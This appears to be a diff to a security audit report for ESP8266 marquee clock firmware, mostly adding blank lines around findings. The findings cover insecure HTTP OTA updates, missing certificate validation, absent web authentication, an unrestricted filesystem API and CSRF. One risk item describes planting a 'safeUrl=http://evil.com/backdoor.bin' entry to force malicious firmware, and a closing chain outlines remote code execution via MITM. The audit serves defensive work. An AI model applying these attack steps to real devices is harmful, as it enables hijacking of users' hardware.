@@ -103,6 +103,7 @@ check is the MD5 hash included in the HTTP response by the hosting server, which
 also transmitted in cleartext.
 
 **Where:**
+
 - `marquee/marquee.ino:556` — `doOtaFlash()` uses `WiFiClient`
 - `marquee/marquee.ino:570` — `handleUpdateFromUrl()` validates URL starts with `http://`
 - `marquee/marquee.ino:769` — auto-update guard requires `firmwareUrl.startsWith("http://")`
@@ -121,6 +122,7 @@ is useless because the attacker controls the HTTP response including the MD5 hea
 This is remote code execution via network position.
 
 **Fix:** This is a platform limitation. Mitigations:
+
 1. Add a hardcoded SHA-256 hash of expected firmware and verify after download
 2. Sign firmware binaries and verify the signature before flashing
 3. Use HTTPS with `WiFiClientSecure` for firmware downloads (costs ~16KB heap during update)
@@ -155,6 +157,7 @@ arbitrary `latestVersion` + `firmwareUrl` values, triggering an automatic firmwa
 replacement.
 
 **Where:**
+
 - `marquee/WagFamBdayClient.cpp:44` — `client->setInsecure()`
 - `marquee/WagFamBdayClient.cpp:168-170` — `firmwareUrl` parsed from JSON
 - `marquee/marquee.ino:767-773` — auto-update triggered when version differs
@@ -169,6 +172,7 @@ This requires no authentication and no user interaction. The attack window is ev
 `minutesBetweenDataRefresh` minutes (default: 15).
 
 **Fix:**
+
 1. Pin the calendar server's certificate fingerprint or use a CA bundle
 2. Validate `firmwareUrl` against an allowlist of trusted domains
 3. Require user confirmation before auto-flashing (e.g., scroll a message and wait for
@@ -224,6 +228,7 @@ None of these handlers call `server.authenticate()`.
 No authentication was ever added to the web UI.
 
 **Risk:**
+
 - **Credential theft:** `/configure` renders API keys in form `value=` attributes
 - **Config tampering:** `/saveconfig` accepts any values via GET parameters
 - **Denial of service:** `/systemreset` deletes config and reboots;
@@ -298,6 +303,7 @@ code (public GitHub repo) knows the credentials for every device. Combined with 
 an attacker on the network has full API access.
 
 **Fix:**
+
 1. Add a `WEB_PASSWORD` key to `/conf.txt` with a random default generated on first boot
 2. Add a password-change field to the `/configure` form
 3. Use the stored password in all `server.authenticate()` calls
@@ -337,6 +343,7 @@ any LittleFS path with no restrictions. An authenticated API user can overwrite
 to an attacker-controlled URL), or delete any file.
 
 **Where:**
+
 - `marquee/marquee.ino:1344-1365` — `handleApiFsRead()` / `handleApiFsWrite()`
 - `marquee/marquee.ino:1390-1398` — `handleApiFsDelete()`
 
@@ -344,6 +351,7 @@ to an attacker-controlled URL), or delete any file.
 provides raw access. No path allowlist or blocklist is enforced.
 
 **Risk:**
+
 - Write a crafted `/ota_pending.txt` with `safeUrl=http://evil.com/backdoor.bin` and
   `boots=1`, then trigger a restart via `/api/restart`. On next boot,
   `checkOtaRollback()` sees `boots >= 2` and flashes the attacker's firmware.
@@ -352,6 +360,7 @@ provides raw access. No path allowlist or blocklist is enforced.
 - Delete `/conf.txt` to reset the device to defaults
 
 **Fix:**
+
 1. Blocklist critical files: reject writes to `/conf.txt` and `/ota_pending.txt` via
    the filesystem API (force config changes through `/api/config`)
 2. Or allowlist: only permit paths under a `/test/` prefix
@@ -458,6 +467,7 @@ and inject arbitrary JSON — including malicious config values (`dataSourceUrl`
 `apiKey`, `firmwareUrl`). This is the enabler for SEC-03.
 
 **Fix:**
+
 1. Pin the server certificate fingerprint (requires updating on cert renewal)
 2. Use `setTrustAnchors()` with a minimal CA bundle for the calendar host
 3. If the calendar host uses Let's Encrypt, pin the ISRG Root X1 CA
@@ -534,11 +544,13 @@ management or token generation.
 
 **Risk:** If a user on the same network visits a malicious page (or a page with
 injected JavaScript), that page can:
+
 - Submit the config form to change settings
 - Trigger `/systemreset` or `/forgetwifi` to DoS the device
 - Call REST API endpoints (with the known default credentials via XHR)
 
 **Fix:**
+
 1. Generate a random CSRF token on boot, store in RAM
 2. Include it as a hidden field in all forms
 3. Validate it on all state-changing GET/POST handlers
@@ -581,6 +593,7 @@ expect_with_fix: "403 unless X-Requested-With header present"
 serial console in plaintext.
 
 **Where:**
+
 - `marquee/WagFamBdayClient.cpp:52` — `Serial.println(myJsonSourceUrl)` (may contain
   embedded API key in URL)
 - `marquee/marquee.ino:980` — `WAGFAM_DATA_URL` printed during config read
@@ -639,12 +652,14 @@ And `marquee/WagFamBdayClient.cpp:156-170` — all config values stored as-is.
 **Why it happens:** The calendar server is implicitly trusted.
 
 **Risk:**
+
 - `dataSourceUrl` redirect: device now fetches calendar data from attacker, enabling
   persistent control even after the original MITM ends
 - `apiKey` override: locks out the legitimate owner's API key
 - `firmwareUrl` injection: triggers firmware replacement (SEC-03)
 
 **Fix:**
+
 1. Validate `dataSourceUrl` starts with `https://` and matches a domain allowlist
 2. Validate `firmwareUrl` against a trusted domain allowlist
 3. Require a confirmation mechanism before applying server-pushed config changes
@@ -777,6 +792,7 @@ the expected IP.
 not supported by the ESP8266 NTP libraries.
 
 **Risk:** Time spoofing could:
+
 - Make the OTA confirmation timer (`OTA_CONFIRM_MS`) fire prematurely or never
 - Display incorrect time on the clock
 - Affect weather refresh scheduling
@@ -819,6 +835,7 @@ DoS via repeated `/api/restart` calls — an attacker can keep the device perpet
 rebooting.
 
 **Fix:**
+
 1. Add a per-IP request counter with a sliding window (e.g., max 10 auth failures per
    minute)
 2. Add a cooldown after `/api/restart` (ignore restart requests within 60s of last restart)
@@ -847,7 +864,7 @@ expect_with_fix: "first request accepted, subsequent requests return 429 (too ma
 
 The most dangerous chain combines multiple findings:
 
-```
+```text
 SEC-08 (no cert validation) + SEC-03 (firmware URL injection) + SEC-02 (HTTP firmware)
 = Remote code execution via MITM with zero user interaction
 
